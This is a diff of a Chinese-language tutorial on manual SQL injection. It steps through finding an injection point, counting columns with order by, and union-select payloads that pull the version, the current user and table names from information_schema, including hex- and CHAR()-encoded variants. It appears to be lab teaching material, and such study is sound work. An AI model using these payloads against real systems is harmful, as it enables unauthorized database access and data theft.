@@ -7,7 +7,9 @@ mail:admin@recorday.cn
 
 
 #标准手工注入流程
+
 ###1.探测注入点
+
 ####1.测试注入点是否存在
 
 常用方法：
@@ -18,6 +20,7 @@ mail:admin@recorday.cn
 
 
 2.逻辑语句判断
+
 这里分析语句可知，用单引号闭合前一个引号，后面执行我们的or语句
 
 payload:`' or 1=1# `
@@ -34,13 +37,17 @@ payload:`' or 1=1# `
 
 在联合查询前，需要判断能显示字段的数量，用到order by 语句
 这里作为演示，猜字段数的区间小一点，尽可能用二分法，凭感觉也可以
+
 ![](http://hitnslab.com:65503/media/upload/SQL3_aLS41LU.png)
 
 ![](http://hitnslab.com:65503/media/upload/SQL4_ge34s6s.png)
+
 之后又试了 orderby3不报错，4报错
+
 因此是3个字段
 
 我们构造如下语句：
+
 `' union select 1,2,3 #`
 
 再次注入查看效果即可
@@ -48,12 +55,15 @@ payload:`' or 1=1# `
 ![](http://hitnslab.com:65503/media/upload/SQL5.png)
 
 那我们替换成
+
 `' union select version(),now(),user()#`
+
 之后呢？
 
 ![](http://hitnslab.com:65503/media/upload/SQL6.png)
 
 没错，这样就可以查询，搜集信息
+
 version()版本信息
 database()数据库名
 user()获取当前用户
@@ -74,14 +84,17 @@ payload如下：
 或者爆指定数据库的表（hex转码）：
 
 ![](http://hitnslab.com:65503/media/upload/SQL9.png)
+
 payload1如下：
 
 `' union select 1,2,table_name from information_schema.tables where table_schema='inject`
 
 payload2如下：
+
 `' union select 1,2,table_name from information_schema.tables where table_schema=0x696E6A656374 #`
 
 同理payload2如下：
+
 `' union select 1,2,table_name from information_schema.tables where table_schema=CHAR(105,110,106,101,99,116)#';`
 
 ####3.读完表名读字段
